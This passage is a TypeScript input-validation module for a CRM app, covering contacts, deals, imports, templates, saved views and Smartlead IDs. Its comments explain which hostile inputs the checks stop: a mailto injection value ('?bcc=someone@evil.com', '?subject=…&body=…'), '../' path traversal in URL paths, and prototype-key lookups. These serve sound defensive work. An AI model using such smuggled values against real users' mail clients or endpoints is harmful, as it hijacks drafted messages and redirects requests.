// Shared input validation for both write entry points: the session-based route
// action (app/routes/home.tsx) and the machine API (app/routes/api.hyperagent.ts).
//
// Before this module the two disagreed about what was acceptable — the machine
// API checked `status` against a whitelist while the session action wrote any
// string it was handed. Everything that validates a CRM write now lives here so
// the two can't drift again.
//
// Isomorphic on purpose (no `.server` suffix): the client uses the same limits
// for `maxLength` attributes and the CSV import preview, so the browser and the
// server agree on what will be rejected.

import { CH, DEAL_ROLES, DEAL_STAGES, OWNERS, STATUSES } from "../crm/data";
import type { DealRole } from "../crm/data";
import { MAX_SEQUENCE_STEPS } from "../crm/smartlead-map";
import {
  TEMPLATE_STATUSES,
  VARIANT_SLOTS,
  type TemplateStatus,
  type VariantSlot,
} from "../crm/templates";
import {
  VIEW_FIELDS,
  VIEW_OPS,
  type ViewCondition,
  type ViewOp,
} from "../crm/views";

/**
 * Per-field maximum lengths, in characters, applied after trimming. Generous
 * enough never to bite a real contact (320 is the RFC 5321 maximum for an email
 * address) but bounded so a single field can't carry a megabyte into D1.
 */
export const LIMITS = {
  name: 200,
  company: 200,
  email: 320,
  phone: 60,
  linkedin: 500,
  source: 200,
  status: 60,
  // A deal's stage id, and the company name typed on the new-deal form. The
  // company limit is deliberately the SAME constant the contact form uses
  // (LIMITS.company above) rather than a second number — the two write the same
  // company through findOrCreateCompanyByName, so a name accepted on one form
  // and rejected on the other would split a company in half.
  dealStage: 60,
  // Brand facts from the directory backfill. `category` sits with the other
  // labels; `arr` needs an order more room because it is not always a figure —
  // the source data runs to 684 characters of enrichment prose on the rows
  // where revenue could not be pinned down, and clipping that would leave a
  // sentence cut mid-word in the UI.
  category: 200,
  arr: 1_000,
  note: 5_000,
  // Email templates. `body` is twice `note` because an email body is not a CRM
  // note — a real cold intro with merge tokens runs long, and truncating one at
  // 5k would silently mangle the copy someone is about to send.
  templateName: 120,
  subject: 300,
  body: 10_000,
  // Smartlead campaign name. Same order as templateName — it is a label in
  // someone else's UI, not content.
  campaignName: 120,
  // Saved-view name. Same family again: it is a sidebar row label, not content.
  viewName: 120,
  // IANA zone identifier ("America/New_York"). Bounded well above the longest
  // real zone name.
  timezone: 60,
  // The prospecting brief a user hands the Origami agent. Longer than any other
  // field here because it is instructions, not a label — "RevOps directors at
  // 50-200 person B2B software companies in the Bay Area who have posted about
  // hiring in the last quarter" is a normal one, and truncating a brief changes
  // who comes back.
  prospectPrompt: 1_000,
  // A prospect's job title, and the URL the agent found them at. Both are
  // provider-supplied, so they are bounded on the way in rather than trusted.
  title: 200,
  sourceUrl: 500,
} as const;

/** Maximum rows accepted in one CSV / API import. */
export const MAX_IMPORT_ROWS = 2_000;

/** Maximum ids accepted by a bulk operation (delete, mark-ads-sent). */
export const MAX_IDS = 1_000;

/** Maximum size of an uploaded CSV file, in bytes. */
export const MAX_CSV_BYTES = 2 * 1024 * 1024;

/**
 * Largest counter a sender may push for one template variant. Ten million sends
 * would be a bug in the sending tool, not a campaign — and an unbounded integer
 * here feeds straight into the z-test, where a garbage denominator produces a
 * confident, wrong verdict.
 */
export const MAX_STAT_COUNT = 10_000_000;

/** Furthest day of a sequence a template may be scheduled on. */
export const MAX_SEND_DAY = 365;

/**
 * Largest figure a single deal may carry, in whole currency units.
 *
 * Bounded for the reason MAX_STAT_COUNT is: the deals board sums open deals into
 * a pipeline total, and one fat-fingered row with fifteen digits makes that
 * total meaningless while looking like a real number. A trillion is far above
 * any deal this CRM will see and far below where float precision starts to slip.
 */
export const MAX_DEAL_VALUE = 1_000_000_000_000;

/** Clauses one saved view may AND together. */
export const MAX_VIEW_CONDITIONS = 10;

/**
 * Saved views the team may keep, in total.
 *
 * Bounded because every view a viewer can see is serialized into the SSR payload
 * of every contacts-page render, and each one is also counted against the whole
 * contact list to fill its sidebar row. Same bounding discipline as MAX_IDS and
 * MAX_IMPORT_ROWS: nothing unbounded reaches a render path.
 */
export const MAX_SAVED_VIEWS = 50;

/**
 * Rows stored from one Origami agent run.
 *
 * The cap matters twice over here. An agent asked for twenty leads can build a
 * table of several thousand — the brief is a suggestion, not a LIMIT clause —
 * and every stored row is serialized into the panel's payload and rendered.
 * Same discipline as MAX_IDS and MAX_IMPORT_ROWS: nothing unbounded reaches a
 * render path, least of all something a third party decided the size of.
 */
export const MAX_PROSPECTS_PER_RUN = 200;

/**
 * Pages of rows one poll will read from an Origami table before it stops.
 *
 * Their rows endpoint caps a page at 200, so three pages is the natural partner
 * to MAX_PROSPECTS_PER_RUN, and it also bounds the wall-clock a single Worker
 * invocation can spend paging.
 */
export const MAX_PROSPECT_ROW_PAGES = 3;

/**
 * Origami's run statuses, verbatim.
 *
 * Only `running` is non-terminal. Note that the six failure-ish states are
 * reported in the response BODY, not as HTTP errors, so nothing else in this app
 * will notice them for us — branching on this value is mandatory.
 *
 * Whitelisted here rather than CHECKed in migration 0013 because the v2 API is
 * documented as beta: a CHECK would turn a newly-added provider status into a
 * failed write on a run already in flight, and SQLite cannot drop a CHECK
 * without rebuilding the table.
 */
export const PROSPECT_STATUSES = [
  "running",
  "completed",
  "needs_input",
  "incomplete",
  "step_cap_hit",
  "cancelled",
  "errored",
  "timed_out",
] as const;

/**
 * Terminal statuses a follow-up run can continue from.
 *
 * `incomplete` ended early on an unparseable tool call, `step_cap_hit` ran out
 * of plan budget, and `cancelled` was stopped by hand — Origami keeps whatever
 * each built, so all three are resumable by sending another run on the same
 * agent. `errored` and `timed_out` are not in this list: both come back with a
 * null response, so there is nothing to continue from.
 */
export const RESUMABLE_PROSPECT_STATUSES = [
  "needs_input",
  "incomplete",
  "step_cap_hit",
  "cancelled",
] as const;

/**
 * Our own pipeline phase, which is deliberately not Origami's `status`.
 *
 * Origami reports no mid-run progress, so its status moves exactly once. This is
 * what tells the next poll whether the work outstanding is "ask the provider
 * again" (`researching`) or "read the table it built" (`reading`).
 */
export const PROSPECT_STAGES = ["starting", "researching", "reading", "ready", "failed"] as const;

/**
 * How much we trust a prospect's email address.
 *
 * DERIVED, never reported: the Origami v2 API exposes no confidence field. See
 * emailConfidence() in app/crm/prospecting.ts for what each one actually means,
 * and note that the UI says so rather than implying we verified anything.
 */
export const EMAIL_CONFIDENCE = ["verified", "likely", "none"] as const;

/** Which test matched an existing contact. Null on a prospect that is new. */
export const DEDUPE_REASONS = ["email", "name"] as const;

/**
 * Why a deal died, offered when a contact's status is set to Dead. A closed set
 * rather than free text: the analytics panel groups on this value exactly, and a
 * typo would silently become its own bucket. The client imports it to render the
 * picker, so both ends offer and accept the same five.
 */
export const DEAD_REASONS = [
  "No response",
  "Not a fit",
  "Timing",
  "Price",
  "Competitor",
] as const;

const STATUS_IDS: ReadonlySet<string> = new Set(STATUSES.map((s) => s.id));
// Derived from DEAL_STAGES rather than restated, the same rule STATUS_IDS
// follows: a stage added to the constant in data.ts is accepted here with no
// second edit, and one removed stops validating immediately. deals.stage carries
// no CHECK (migrations/0018 says why), so this set is the only gate on it.
const DEAL_STAGE_IDS: ReadonlySet<string> = new Set(DEAL_STAGES.map((s) => s.id));
const DEAL_ROLE_SET: ReadonlySet<string> = new Set<string>(DEAL_ROLES);
const TOUCH_TYPES: ReadonlySet<string> = new Set(Object.keys(CH));
const DEAD_REASON_SET: ReadonlySet<string> = new Set(DEAD_REASONS);
const TEMPLATE_STATUS_SET: ReadonlySet<string> = new Set(TEMPLATE_STATUSES);
const VARIANT_SLOT_SET: ReadonlySet<string> = new Set(VARIANT_SLOTS);
const VIEW_FIELD_SET: ReadonlySet<string> = new Set(VIEW_FIELDS.map((f) => f.key));
const VIEW_OP_SET: ReadonlySet<string> = new Set(VIEW_OPS);
const PROSPECT_STATUS_SET: ReadonlySet<string> = new Set(PROSPECT_STATUSES);
const PROSPECT_STAGE_SET: ReadonlySet<string> = new Set(PROSPECT_STAGES);
const RESUMABLE_PROSPECT_STATUS_SET: ReadonlySet<string> = new Set(RESUMABLE_PROSPECT_STATUSES);
const EMAIL_CONFIDENCE_SET: ReadonlySet<string> = new Set(EMAIL_CONFIDENCE);
const DEDUPE_REASON_SET: ReadonlySet<string> = new Set(DEDUPE_REASONS);

/**
 * Each filterable field's closed value set, so a condition's value can be checked
 * against the field it names rather than against a flat union of every field's
 * values — otherwise `owner is New` would validate.
 */
const VIEW_VALUE_SETS: ReadonlyMap<string, ReadonlySet<string>> = new Map(
  VIEW_FIELDS.map((f) => [f.key, new Set(f.options.map((o) => o.value))]),
);

export function isValidStatus(value: unknown): value is string {
  return typeof value === "string" && STATUS_IDS.has(value);
}

/**
 * A deal stage, checked against DEAL_STAGES — NOT against STATUSES. The two are
 * separate vocabularies that are allowed to diverge (see migrations/0018), so
 * "Meeting booked" is not a deal stage and "Negotiation" is not a contact status.
 */
export function isValidDealStage(value: unknown): value is string {
  return typeof value === "string" && DEAL_STAGE_IDS.has(value);
}

/**
 * A stakeholder role. Exactly 'primary' or 'secondary' — the closed two-value set
 * CHECKed in migrations/0018. Anything else is a bug or an attack, the same
 * standing isValidLoop takes on loop numbers.
 */
export function isValidDealRole(value: unknown): value is DealRole {
  return typeof value === "string" && DEAL_ROLE_SET.has(value);
}

export function isValidTouchType(value: unknown): value is string {
  return typeof value === "string" && TOUCH_TYPES.has(value);
}

export function isValidDeadReason(value: unknown): value is string {
  return typeof value === "string" && DEAD_REASON_SET.has(value);
}

export function isValidTemplateStatus(value: unknown): value is TemplateStatus {
  return typeof value === "string" && TEMPLATE_STATUS_SET.has(value);
}

export function isValidVariantSlot(value: unknown): value is VariantSlot {
  return typeof value === "string" && VARIANT_SLOT_SET.has(value);
}

export function isValidViewField(value: unknown): value is string {
  return typeof value === "string" && VIEW_FIELD_SET.has(value);
}

export function isValidViewOp(value: unknown): value is ViewOp {
  return typeof value === "string" && VIEW_OP_SET.has(value);
}

/** Loop numbers are a closed set of two; anything else is a bug or an attack. */
export function isValidLoop(value: unknown): value is number {
  return value === 1 || value === 2;
}

/**
 * Owners are looked up as `OWNERS[name]` in the UI, so an arbitrary string here
 * would reach a prototype-chain property (`"constructor"` returns a function,
 * not undefined). `Object.hasOwn` keeps the lookup to real own keys.
 */
export function isValidOwner(value: unknown): value is string {
  return typeof value === "string" && Object.hasOwn(OWNERS, value);
}

/**
 * Coerce an unknown value to a trimmed string. Non-strings become "" rather
 * than throwing — several call sites previously did `.trim()` straight on a
 * JSON-parsed value, which threw a TypeError when a caller sent a number.
 */
export function asString(value: unknown): string {
  return typeof value === "string" ? value.trim() : "";
}

/** True when `value` is a string that fits within `max` after trimming. */
export function fits(value: unknown, max: number): boolean {
  return asString(value).length <= max;
}

// Deliberately permissive about what an address may contain — this rejects the
// obviously malformed (spaces, no @, no dot in the domain) without trying to
// out-guess RFC 5322. The allowlist, not this regex, decides who may sign in.
//
// The excluded set does include the URL-significant characters `? & = # % /`,
// which real addresses never carry. That is load-bearing for safeMailto(): an
// address ending `?subject=…&body=…` is otherwise well-formed enough to pass a
// naive check, and would then prefill an attacker-controlled draft in the user's
// mail client. Excluding a second `@` is not sufficient — that only catches the
// `?bcc=someone@evil.com` shape, not `?subject=x&body=y`.
const EMAIL_CHAR = `[^\\s@,;:<>"'()\\[\\]\\\\?&=#%/]`;
const EMAIL_RE = new RegExp(`^${EMAIL_CHAR}+@${EMAIL_CHAR}+\\.${EMAIL_CHAR}+$`);

export function isValidEmail(value: unknown): boolean {
  const s = asString(value);
  return s.length > 0 && s.length <= LIMITS.email && EMAIL_RE.test(s);
}

export type ContactFields = {
  name: string;
  company: string;
  email: string | null;
  phone: string | null;
  linkedin: string | null;
  loops: number[] | undefined;
  owner: string | null;
  status: string;
  source: string | null;
  category: string | null;
  arr: string | null;
};

export type ValidationResult =
  | { ok: true; value: ContactFields }
  | { ok: false; error: string };

/**
 * Validate and normalize one contact from either entry point. Accepts `unknown`
 * for every field because both callers receive untrusted input (FormData values
 * on one side, `JSON.parse` output on the other) — nothing here may assume a
 * string arrived.
 *
 * Unknown `owner` / `status` values are rejected rather than silently dropped:
 * a caller sending "Bretton" wants to know it didn't stick, and silently writing
 * NULL would let a typo escape the owner filter and the cross-owner conflict
 * check without any signal.
 */
export function validateContact(raw: unknown): ValidationResult {
  const r = (raw ?? {}) as Record<string, unknown>;

  const name = asString(r.name);
  if (!name) return { ok: false, error: "Name is required." };
  if (name.length > LIMITS.name) {
    return { ok: false, error: `Name must be ${LIMITS.name} characters or fewer.` };
  }

  const company = asString(r.company);
  if (company.length > LIMITS.company) {
    return { ok: false, error: `Company must be ${LIMITS.company} characters or fewer.` };
  }

  const email = asString(r.email);
  if (email && !isValidEmail(email)) {
    return { ok: false, error: `"${truncateForMessage(email)}" is not a valid email address.` };
  }

  const phone = asString(r.phone);
  if (phone.length > LIMITS.phone) {
    return { ok: false, error: `Phone must be ${LIMITS.phone} characters or fewer.` };
  }

  const linkedin = asString(r.linkedin);
  if (linkedin.length > LIMITS.linkedin) {
    return { ok: false, error: `LinkedIn must be ${LIMITS.linkedin} characters or fewer.` };
  }

  const source = asString(r.source);
  if (source.length > LIMITS.source) {
    return { ok: false, error: `Source must be ${LIMITS.source} characters or fewer.` };
  }

  const category = asString(r.category);
  if (category.length > LIMITS.category) {
    return { ok: false, error: `Category must be ${LIMITS.category} characters or fewer.` };
  }

  const arr = asString(r.arr);
  if (arr.length > LIMITS.arr) {
    return { ok: false, error: `ARR must be ${LIMITS.arr} characters or fewer.` };
  }

  // Empty/absent status means "use the default", which matches the previous
  // `form.get("status") || "New"` behaviour.
  const rawStatus = asString(r.status);
  const status = rawStatus || "New";
  if (!isValidStatus(status)) {
    return { ok: false, error: `Unknown status "${truncateForMessage(rawStatus)}".` };
  }

  // "Unassigned" is the sentinel the add-contact form's select submits.
  const rawOwner = asString(r.owner);
  const ownerGiven = rawOwner && rawOwner !== "Unassigned";
  if (ownerGiven && !isValidOwner(rawOwner)) {
    return { ok: false, error: `Unknown owner "${truncateForMessage(rawOwner)}".` };
  }

  let loops: number[] | undefined;
  if (r.loops !== undefined && r.loops !== null) {
    if (!Array.isArray(r.loops)) {
      return { ok: false, error: "Loops must be an array." };
    }
    const parsed = r.loops.map(Number).filter(isValidLoop);
    // An array that was present but contained nothing usable is a caller error,
    // not a request for the default.
    if (!parsed.length) return { ok: false, error: "Loops must contain 1 or 2." };
    loops = [...new Set(parsed)].sort();
  }

  return {
    ok: true,
    value: {
      name,
      company,
      email: email || null,
      phone: phone || null,
      linkedin: linkedin || null,
      loops,
      owner: ownerGiven ? rawOwner : null,
      status,
      source: source || null,
      category: category || null,
      arr: arr || null,
    },
  };
}

export type DealFields = {
  companyName: string;
  stage: string;
  value: number | null;
  expectedCloseDate: string | null;
  primaryContactId: string | null;
};

/** ISO calendar date, "2026-09-30". Not a timestamp — a close date is a day. */
const ISO_DATE_RE = /^\d{4}-\d{2}-\d{2}$/;

/**
 * Validate one new deal from the /deals form.
 *
 * Same shape and standing as validateContact: `unknown` in, a normalized value
 * or a sentence out, and unknown enum values rejected rather than dropped.
 *
 * `value` is optional AND distinguishes absent from zero, the rule
 * validateStats already establishes for pushed counters: a deal nobody has
 * priced is null, and a deal priced at 0 is a real (bad) deal. Coercing "" to 0
 * would make those two indistinguishable in the pipeline total.
 */
export function validateDeal(raw: unknown):
  | { ok: true; value: DealFields }
  | { ok: false; error: string } {
  const r = (raw ?? {}) as Record<string, unknown>;

  const companyName = asString(r.companyName);
  if (!companyName) return { ok: false, error: "Company is required." };
  // The SAME limit the contact form applies — both write a company through
  // findOrCreateCompanyByName, so they must agree on what fits.
  if (companyName.length > LIMITS.company) {
    return { ok: false, error: `Company must be ${LIMITS.company} characters or fewer.` };
  }

  const rawStage = asString(r.stage);
  const stage = rawStage || DEAL_STAGES[0].id;
  if (!isValidDealStage(stage)) {
    return { ok: false, error: `Unknown deal stage "${truncateForMessage(rawStage)}".` };
  }

  let value: number | null = null;
  const rawValue = r.value;
  if (rawValue !== undefined && rawValue !== null && asString(rawValue) !== "") {
    const n = Number(rawValue);
    if (!Number.isFinite(n)) return { ok: false, error: "Deal value must be a number." };
    if (n < 0) return { ok: false, error: "Deal value can't be negative." };
    // Same bounding discipline as MAX_STAT_COUNT: nothing unbounded reaches a
    // render path, and a pipeline total is summed across every open deal.
    if (n > MAX_DEAL_VALUE) {
      return { ok: false, error: "Deal value is larger than this CRM will track." };
    }
    value = Math.round(n);
  }

  let expectedCloseDate: string | null = null;
  const rawDate = asString(r.expectedCloseDate);
  if (rawDate) {
    if (!ISO_DATE_RE.test(rawDate)) {
      return { ok: false, error: "Expected close date must be YYYY-MM-DD." };
    }
    // Shape alone accepts "2026-02-31". Round-tripping through Date is what
    // rejects a day that does not exist.
    const parsed = new Date(rawDate + "T00:00:00.000Z");
    if (Number.isNaN(parsed.getTime()) || parsed.toISOString().slice(0, 10) !== rawDate) {
      return { ok: false, error: `"${truncateForMessage(rawDate)}" is not a real date.` };
    }
    expectedCloseDate = rawDate;
  }

  const primaryContactId = asString(r.primaryContactId) || null;

  return {
    ok: true,
    value: { companyName, stage, value, expectedCloseDate, primaryContactId },
  };
}

/**
 * Validate a batch of imported rows. Invalid rows are skipped rather than
 * failing the whole import — a 500-row CSV with three bad addresses should
 * still land the other 497 — but the count and the first reason come back so
 * the UI can say what was dropped.
 */
export function validateImportRows(raw: unknown):
  | { ok: true; rows: ContactFields[]; skipped: number; firstError: string | null }
  | { ok: false; error: string } {
  if (!Array.isArray(raw)) {
    return { ok: false, error: "Imported rows must be an array." };
  }
  if (raw.length > MAX_IMPORT_ROWS) {
    return {
      ok: false,
      error: `Too many rows: ${raw.length}. The maximum per import is ${MAX_IMPORT_ROWS}.`,
    };
  }

  const rows: ContactFields[] = [];
  let skipped = 0;
  let firstError: string | null = null;

  for (const row of raw) {
    const result = validateContact(row);
    if (result.ok) {
      rows.push(result.value);
    } else {
      skipped++;
      if (!firstError) firstError = result.error;
    }
  }

  if (!rows.length) {
    return { ok: false, error: firstError ?? "No valid contacts to import." };
  }
  return { ok: true, rows, skipped, firstError };
}

/**
 * Validate a bulk id list. Ids are opaque to us (they're `crypto.randomUUID()`
 * output), so this bounds the count and drops non-strings rather than checking
 * a format — a wrong-but-well-formed id simply matches no row.
 */
export function validateIds(raw: unknown):
  | { ok: true; ids: string[] }
  | { ok: false; error: string } {
  if (!Array.isArray(raw)) return { ok: false, error: "Expected a list of contacts." };
  if (!raw.length) return { ok: false, error: "No contacts selected." };
  if (raw.length > MAX_IDS) {
    return {
      ok: false,
      error: `Too many contacts selected: ${raw.length}. The maximum is ${MAX_IDS}.`,
    };
  }
  const ids = [...new Set(raw.filter((id): id is string => typeof id === "string" && !!id))];
  if (!ids.length) return { ok: false, error: "No contacts selected." };
  return { ok: true, ids };
}

/** Bound a free-text note. Returns null when empty. */
export function validateNote(raw: unknown):
  | { ok: true; text: string }
  | { ok: false; error: string } {
  const text = asString(raw);
  if (!text) return { ok: false, error: "Note text is required." };
  if (text.length > LIMITS.note) {
    return { ok: false, error: `Notes must be ${LIMITS.note} characters or fewer.` };
  }
  return { ok: true, text };
}

/** Keep an echoed-back bad value short so an error message can't be a payload. */
function truncateForMessage(value: string): string {
  return value.length > 40 ? value.slice(0, 40) + "…" : value;
}

// ---------------------------------------------------------------------------
// Email templates
// ---------------------------------------------------------------------------

export type TemplateFields = { name: string; loop: number; sendDay: number };

/**
 * Validate a template's settings (name, loop, which day of the sequence it goes
 * out on). Mirrors validateContact: accepts `unknown` for every field because
 * both entry points hand over untrusted input.
 *
 * The *create* path does not call this — "+ New" writes the `UNTITLED` constant
 * and the defaults, so a name is only ever required once someone edits it.
 */
export function validateTemplate(raw: unknown):
  | { ok: true; value: TemplateFields }
  | { ok: false; error: string } {
  const r = (raw ?? {}) as Record<string, unknown>;

  const name = asString(r.name);
  if (!name) return { ok: false, error: "Template name is required." };
  if (name.length > LIMITS.templateName) {
    return {
      ok: false,
      error: `Template name must be ${LIMITS.templateName} characters or fewer.`,
    };
  }

  // Absent means "the default" — Loop 1, the always-on sequence.
  const rawLoop = r.loop;
  const loop = rawLoop === undefined || rawLoop === null || rawLoop === "" ? 1 : Number(rawLoop);
  if (!isValidLoop(loop)) return { ok: false, error: "Loop must be 1 or 2." };

  const rawSendDay = r.sendDay;
  const sendDay =
    rawSendDay === undefined || rawSendDay === null || rawSendDay === ""
      ? 0
      : Number(rawSendDay);
  if (!Number.isInteger(sendDay) || sendDay < 0 || sendDay > MAX_SEND_DAY) {
    return {
      ok: false,
      error: `Send day must be a whole number between 0 and ${MAX_SEND_DAY}.`,
    };
  }

  return { ok: true, value: { name, loop, sendDay } };
}

/**
 * Validate one variant's copy.
 *
 * Both fields may be **empty**: a draft in progress has to be savable, and the
 * page renders a placeholder for each. Only over-length is an error.
 *
 * No sanitisation of the `{{first_name}}` / `{{company}}` / `{{sender}}` merge
 * tokens, and none is wanted: the copy is stored verbatim and rendered as a text
 * node, never as HTML and never interpolated. If a future feature does start
 * substituting them, the escaping belongs at that point of use, not here.
 */
export function validateVariantContent(raw: unknown):
  | { ok: true; value: { subject: string; body: string } }
  | { ok: false; error: string } {
  const r = (raw ?? {}) as Record<string, unknown>;

  const subject = asString(r.subject);
  if (subject.length > LIMITS.subject) {
    return { ok: false, error: `Subject must be ${LIMITS.subject} characters or fewer.` };
  }

  const body = asString(r.body);
  if (body.length > LIMITS.body) {
    return { ok: false, error: `Body must be ${LIMITS.body} characters or fewer.` };
  }

  return { ok: true, value: { subject, body } };
}

/**
 * One pushed counter set. `null` means "leave this column alone" — see
 * validateStats for why that is not the same as zero.
 */
export type StatCounts = {
  sends: number | null;
  opens: number | null;
  replies: number | null;
  meetings: number | null;
};

const STAT_KEYS = ["sends", "opens", "replies", "meetings"] as const;

/**
 * Validate a stats push. Every field is optional, and absent (`undefined`,
 * `null` or `""`) maps to `null`, which recordVariantStats() COALESCEs into "keep
 * the stored value".
 *
 * That distinction is load-bearing: `Number("")` is `0`, so coercing blindly
 * would let a caller that mentions only `replies` silently zero the other three
 * counters — and since the verdict is computed from them, that reads as a real
 * change in performance rather than a bug.
 *
 * No cross-field validation (`opens <= sends`, `replies <= opens`). Pixel-blocking
 * makes `replies > opens` genuinely common, and partial pushes arrive out of
 * order, so those inequalities are false in the real world often enough that
 * enforcing them would reject correct data.
 */
export function validateStats(raw: unknown):
  | { ok: true; value: StatCounts }
  | { ok: false; error: string } {
  const r = (raw ?? {}) as Record<string, unknown>;
  const value: StatCounts = { sends: null, opens: null, replies: null, meetings: null };
  let given = 0;

  for (const key of STAT_KEYS) {
    const rawValue = r[key];
    if (rawValue === undefined || rawValue === null || rawValue === "") continue;
    const n = Number(typeof rawValue === "string" ? rawValue.trim() : rawValue);
    if (!Number.isInteger(n) || n < 0 || n > MAX_STAT_COUNT) {
      const shown = truncateForMessage(String(rawValue));
      return {
        ok: false,
        error: `"${shown}" is not a whole number between 0 and ${MAX_STAT_COUNT}.`,
      };
    }
    value[key] = n;
    given++;
  }

  if (!given) return { ok: false, error: "Nothing to record." };
  return { ok: true, value };
}

/**
 * Resolve which variant a write targets: an opaque `variantId`, or the stable
 * `slot` ("A"/"B") within a template.
 *
 * The slot form exists for the machine caller — it can store one id per template
 * and keep pushing to "B" even if B is added long after it was configured. It is
 * unambiguous because of the unique (template_id, slot) index.
 *
 * Shared by the form action and /api/hyperagent so the two can't drift, which is
 * the entire reason this module exists.
 */
export function validateVariantTarget(raw: unknown):
  | { ok: true; value: { templateId: string; variantId?: string; slot?: string } }
  | { ok: false; error: string } {
  const r = (raw ?? {}) as Record<string, unknown>;

  const templateId = asString(r.templateId);
  if (!templateId) return { ok: false, error: "Missing template id." };

  const variantId = asString(r.variantId);
  const slot = asString(r.slot);

  if (variantId && slot) {
    return { ok: false, error: "Give either a variant id or a slot, not both." };
  }
  if (variantId) return { ok: true, value: { templateId, variantId } };
  if (slot) {
    if (!isValidVariantSlot(slot)) {
      return { ok: false, error: `Unknown variant "${truncateForMessage(slot)}".` };
    }
    return { ok: true, value: { templateId, slot } };
  }
  return { ok: false, error: "Missing variant id or slot." };
}

// ---------------------------------------------------------------------------
// Saved views
// ---------------------------------------------------------------------------

/**
 * A saved view's settings. Note what is absent: any creator identity. This module
 * knows nothing about sessions, so createSavedView() takes the creator as a
 * separate parameter — the same split as removeVariant(db, ..., actor).
 */
export type SavedViewFields = {
  name: string;
  shared: boolean;
  conditions: ViewCondition[];
};

/**
 * Coerce a checkbox-ish value to a boolean. FormData gives "on" for a checked
 * box, the client sends "1"/"0", and a JSON caller would send a real boolean —
 * all three have to mean the same thing.
 */
function asBool(value: unknown, fallback: boolean): boolean {
  if (typeof value === "boolean") return value;
  if (typeof value === "number") return value !== 0;
  if (typeof value !== "string") return fallback;
  const v = value.trim().toLowerCase();
  if (v === "") return fallback;
  return v === "1" || v === "true" || v === "on" || v === "yes";
}

/**
 * Validate a saved view. Mirrors validateTemplate: accepts `unknown` for every
 * field, and returns a user-facing sentence rather than a code.
 *
 * The empty-conditions check is load-bearing. matchesConditions([]) is a vacuous
 * AND and so matches every contact — saving one would produce a view that
 * silently means "all contacts" under a name promising something narrower, which
 * reads as the filter being broken rather than as the view being empty.
 *
 * Each value is checked against *its own field's* option set. A value outside it
 * is not an injection risk (nothing here reaches SQL — see app/crm/views.ts), but
 * it renders as a view that matches nothing, forever, with no way to tell why.
 */
export function validateSavedView(raw: unknown):
  | { ok: true; value: SavedViewFields }
  | { ok: false; error: string } {
  const r = (raw ?? {}) as Record<string, unknown>;

  const name = asString(r.name);
  if (!name) return { ok: false, error: "View name is required." };
  if (name.length > LIMITS.viewName) {
    return { ok: false, error: `View name must be ${LIMITS.viewName} characters or fewer.` };
  }

  const rawConditions = r.conditions;
  if (!Array.isArray(rawConditions) || rawConditions.length === 0) {
    return { ok: false, error: "Add at least one condition." };
  }
  if (rawConditions.length > MAX_VIEW_CONDITIONS) {
    return {
      ok: false,
      error: `A view can have at most ${MAX_VIEW_CONDITIONS} conditions.`,
    };
  }

  const conditions: ViewCondition[] = [];
  for (const entry of rawConditions) {
    const e = (entry ?? {}) as Record<string, unknown>;
    const field = asString(e.field);
    if (!isValidViewField(field)) {
      return { ok: false, error: `Unknown filter field "${truncateForMessage(field)}".` };
    }
    const op = asString(e.op);
    if (!isValidViewOp(op)) {
      return { ok: false, error: `Unknown filter operator "${truncateForMessage(op)}".` };
    }
    const value = asString(e.value);
    if (!VIEW_VALUE_SETS.get(field)?.has(value)) {
      return { ok: false, error: `Unknown value "${truncateForMessage(value)}".` };
    }
    conditions.push({ field, op, value });
  }

  return { ok: true, value: { name, shared: asBool(r.shared, true), conditions } };
}

// ---------------------------------------------------------------------------
// Smartlead
//
// The sending tool the /smartlead page drives. Everything below guards a value
// that is about to leave this app for a third-party API, which is a different
// threat model from the rest of this module: a bad `status` here doesn't corrupt
// a local filter, it makes a paid campaign start sending.
// ---------------------------------------------------------------------------

/**
 * Campaign lifecycle values Smartlead accepts as *input*.
 *
 * Note `START`, not `ACTIVE`. Smartlead's API takes START to activate or resume a
 * campaign but reports the resulting state as ACTIVE, so a response value copied
 * straight back into a request is rejected. Keeping the input set closed here is
 * what stops that round-trip being attempted.
 */
export const SMARTLEAD_STATUSES = ["START", "PAUSED", "STOPPED"] as const;
export type SmartleadStatus = (typeof SMARTLEAD_STATUSES)[number];

const SMARTLEAD_STATUS_SET: ReadonlySet<string> = new Set(SMARTLEAD_STATUSES);

export function isValidSmartleadStatus(value: unknown): value is SmartleadStatus {
  return typeof value === "string" && SMARTLEAD_STATUS_SET.has(value);
}

/** Largest contact push accepted in one action. See the chunk size below. */
export const MAX_LEAD_PUSH = 1_000;

/**
 * Leads per Smartlead request. Their endpoint caps a `lead_list` at around 100,
 * and each chunk is one Worker subrequest — so MAX_LEAD_PUSH / this is the
 * subrequest cost of a full push (10), comfortably inside the platform ceiling.
 */
export const SMARTLEAD_LEAD_CHUNK = 100;

/** Rows read per page when totalling campaign statistics. */
export const SMARTLEAD_STATS_PAGE = 100;

/**
 * Pages of statistics one sync will read. Deliberately a hard stop rather than a
 * "read what we can": these counters are ABSOLUTE lifetime totals, so writing a
 * partial aggregate doesn't under-report by a little, it looks like performance
 * collapsed. The sync writes nothing and says so instead.
 */
export const SMARTLEAD_STATS_MAX_PAGES = 20;

/** Mailboxes read per page when listing the Smartlead account's email accounts. */
export const SMARTLEAD_SENDER_PAGE = 100;

/**
 * Pages of email accounts one "Fetch senders" will read.
 *
 * A soft stop, unlike SMARTLEAD_STATS_MAX_PAGES above: this list is only offered
 * as things to assign, so reading part of it under-offers rather than
 * misreporting anything. The page says how many it found, and the mailboxes
 * already on the campaign come from a separate call that is never truncated.
 */
export const SMARTLEAD_SENDER_MAX_PAGES = 5;

/**
 * Validate a Smartlead email account (mailbox) id.
 *
 * Digits only, for the same reason validateCampaignId is: the value is posted
 * back to Smartlead under a live key, in the field that decides which mailboxes
 * a campaign sends from. It never reaches a URL path — smartlead.server.ts puts
 * it in the request body — but the client re-checks it there anyway, exactly as
 * it re-checks campaign ids.
 */
export function validateEmailAccountId(raw: unknown):
  | { ok: true; id: string }
  | { ok: false; error: string } {
  const id = asString(raw);
  if (!id) return { ok: false, error: "Missing mailbox id." };
  if (!/^\d{1,19}$/.test(id)) {
    return { ok: false, error: `"${truncateForMessage(id)}" is not a valid mailbox id.` };
  }
  return { ok: true, id };
}

/**
 * Validate a Smartlead campaign id.
 *
 * Load-bearing beyond the usual bounds check: this value is interpolated into a
 * URL *path* (`/campaigns/{id}/sequences`). Digits only means it cannot carry a
 * `../`, a query string, or anything else that would re-point the request at a
 * different endpoint — the same reasoning as isValidEmail excluding `? & = # % /`
 * for safeMailto's benefit.
 */
export function validateCampaignId(raw: unknown):
  | { ok: true; id: string }
  | { ok: false; error: string } {
  const id = asString(raw);
  if (!id) return { ok: false, error: "Missing campaign id." };
